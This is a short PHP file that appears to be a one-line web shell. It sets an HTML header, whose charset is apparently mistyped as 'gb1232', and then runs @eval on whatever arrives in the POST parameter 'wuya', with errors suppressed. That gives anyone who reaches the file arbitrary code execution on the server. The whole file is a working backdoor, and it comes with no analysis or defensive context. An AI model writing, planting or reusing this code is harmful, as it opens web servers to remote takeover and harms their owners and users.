<?php
	header("Content-type:text/html;charset=gb1232");
	echo "<pre>";
	@eval($_POST['wuya']); 
?>